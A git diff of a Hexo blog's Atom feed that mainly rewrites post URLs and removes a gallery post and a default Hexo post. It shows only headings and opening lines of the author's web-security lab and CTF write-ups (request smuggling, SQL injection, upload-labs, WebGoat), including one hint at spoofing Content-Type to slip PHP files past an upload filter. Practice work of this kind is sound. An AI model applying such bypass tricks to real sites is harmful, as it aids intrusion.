         <content type="html">&lt;h1 id=&#34;http请求走私是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http请求走私是什么&#34;&gt;#&lt;/a&gt; HTTP 请求走私是什么&lt;/h1&gt;
 &lt;p&gt;HTTP 请求走私，一种干扰网站处理来自用户的 HTTP &lt;ins class=&#34;wavy&#34;&gt;请求序列&lt;/ins&gt; 的技术&lt;/p&gt;
 &lt;h2 id=&#34;相关知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#相关知识点&#34;&gt;#&lt;/a&gt; 相关知识点&lt;/h2&gt;
@@ -561,9 +685,9 @@ Transfer-Encoding: x&lt;/li&gt;
         <updated>2021-08-03T02:20:54.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/07/05/other/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/</id>
+        <id>http://example.com/2021/07/05/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/</id>
         <title>收藏夹喔</title>
-        <link rel="alternate" href="http://example.com/2021/07/05/other/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/"/>
+        <link rel="alternate" href="http://example.com/2021/07/05/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/"/>
         <content type="html">&lt;p&gt;&lt;ins class=&#34;wavy&#34;&gt;&lt;span class=&#34;rainbow&#34;&gt;好多值得再看的文章系列 o (￣ε￣*)&lt;/span&gt;&lt;/ins&gt;&lt;/p&gt;
 &lt;details class=&#34;danger&#34;&gt;&lt;summary&gt;内网相关&lt;/summary&gt;&lt;div&gt;
 &lt;div class=&#34;note info&#34;&gt;
@@ -609,37 +733,19 @@ Transfer-Encoding: x&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/rAcctU4XArY8SZYwkOAYjA&#34;&gt;XSS 大王&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/div&gt;&lt;/details&gt;
+&lt;p&gt;testtest&lt;/p&gt;
+&lt;h1 id=&#34;一号标题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一号标题&#34;&gt;#&lt;/a&gt; 一号标题&lt;/h1&gt;
+&lt;h2 id=&#34;二号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二号&#34;&gt;#&lt;/a&gt; 二号&lt;/h2&gt;
+&lt;h3 id=&#34;三号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三号&#34;&gt;#&lt;/a&gt; 三号&lt;/h3&gt;
+&lt;h4 id=&#34;四号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#四号&#34;&gt;#&lt;/a&gt; 四号&lt;/h4&gt;
+&lt;h5 id=&#34;五号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#五号&#34;&gt;#&lt;/a&gt; 五号&lt;/h5&gt;
 </content>
         <updated>2021-07-05T03:25:08.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/07/04/gallery/index/</id>
-        <title>Gallery Post</title>
-        <link rel="alternate" href="http://example.com/2021/07/04/gallery/index/"/>
-        <content type="html">&lt;p class=&#34;gallery&#34; data-height=&#34;120&#34;&gt;&lt;img src=&#34;img/1.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/2.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/3.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/4.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/5.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/6.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/7.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/8.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/9.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/10.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/11.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/12.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/13.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/14.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/15.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/16.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;img/17.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-</content>
-        <updated>2021-07-04T06:24:39.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://example.com/2021/06/29/dmx/buuctf-web/</id>
+        <id>http://example.com/2021/06/29/buuctf-web/</id>
         <title>Buuctf-web 武林秘籍</title>
-        <link rel="alternate" href="http://example.com/2021/06/29/dmx/buuctf-web/"/>
+        <link rel="alternate" href="http://example.com/2021/06/29/buuctf-web/"/>
         <content type="html">&lt;h2 id=&#34;极客大挑战2019-upload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战2019-upload&#34;&gt;#&lt;/a&gt; 极客大挑战 2019 upload&lt;/h2&gt;
 &lt;p&gt;&lt;em&gt;关键词：php，phtml，过滤 &amp;lt;?，文件上传&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;根据 Content-Type 判断图片：Content-Type: image/png&lt;/p&gt;
@@ -867,9 +973,9 @@ Transfer-Encoding: x&lt;/li&gt;
         <updated>2021-06-29T03:30:13.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/01/28/dmsj/webgoat%E5%AE%A1%E8%AE%A1/</id>
+        <id>http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/</id>
         <title>webgoat审计</title>
-        <link rel="alternate" href="http://example.com/2021/01/28/dmsj/webgoat%E5%AE%A1%E8%AE%A1/"/>
+        <link rel="alternate" href="http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/"/>
         <content type="html">&lt;h1 id=&#34;搭建概述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搭建概述&#34;&gt;#&lt;/a&gt; 搭建概述&lt;/h1&gt;
 &lt;p&gt;前提：&lt;/p&gt;
 &lt;ul&gt;
@@ -1326,9 +1432,9 @@ Transfer-Encoding: x&lt;/li&gt;
         <updated>2021-01-28T01:28:50.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</id>
+        <id>http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</id>
         <title>upload-labs基础关卡</title>
-        <link rel="alternate" href="http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"/>
+        <link rel="alternate" href="http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"/>
         <content type="html">&lt;h1 id=&#34;pass-01&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-01&#34;&gt;#&lt;/a&gt; Pass-01&lt;/h1&gt;
 &lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
 &lt;p&gt;第一关，通常随便传把哈哈哈&lt;/p&gt;
@@ -1682,9 +1788,9 @@ Transfer-Encoding: x&lt;/li&gt;
         <updated>2020-11-25T13:24:52.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</id>
+        <id>http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</id>
         <title>sqli-labs基础关卡</title>
-        <link rel="alternate" href="http://example.com/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"/>
+        <link rel="alternate" href="http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"/>
         <content type="html">&lt;h1 id=&#34;less-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-1&#34;&gt;#&lt;/a&gt; Less-1&lt;/h1&gt;
 &lt;p&gt;date:2020-11-16 21:29:27&lt;/p&gt;
 &lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
@@ -2819,9 +2925,9 @@ Transfer-Encoding: x&lt;/li&gt;
         <updated>2020-11-16T13:29:27.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/</id>
+        <id>http://example.com/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/</id>
         <title>pikachu大冒险鸭</title>
-        <link rel="alternate" href="http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/"/>
+        <link rel="alternate" href="http://example.com/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/"/>
         <content type="html">&lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
 &lt;h2 id=&#34;搜索型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搜索型注入&#34;&gt;#&lt;/a&gt; 搜索型注入&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
@@ -3159,9 +3265,9 @@ msg(content);&lt;br&gt;
         <updated>2020-10-30T03:46:05.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/</id>
+        <id>http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/</id>
         <title>dorabox冒险手记</title>
-        <link rel="alternate" href="http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"/>
+        <link rel="alternate" href="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"/>
         <content type="html">&lt;h1 id=&#34;sqli字符型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli字符型&#34;&gt;#&lt;/a&gt; SQLi 字符型&lt;/h1&gt;
 &lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
 &lt;p&gt;字符型和数字型相比，就是要闭合单引号吧&lt;/p&gt;
@@ -3852,26 +3958,5 @@ Queue.put_nowait (item): 往队列里存放元素，不等待&lt;br&gt;
 </content>
         <category term="dorabox,靶场练习" />
         <updated>2020-10-15T08:40:33.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://example.com/2016/04/14/other/hello-world/</id>
-        <title>认识Markdown</title>
-        <link rel="alternate" href="http://example.com/2016/04/14/other/hello-world/"/>
-        <content type="html">&lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
-&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
-</content>
-        <updated>2016-04-14T01:47:13.000Z</updated>
     </entry>
 </feed>
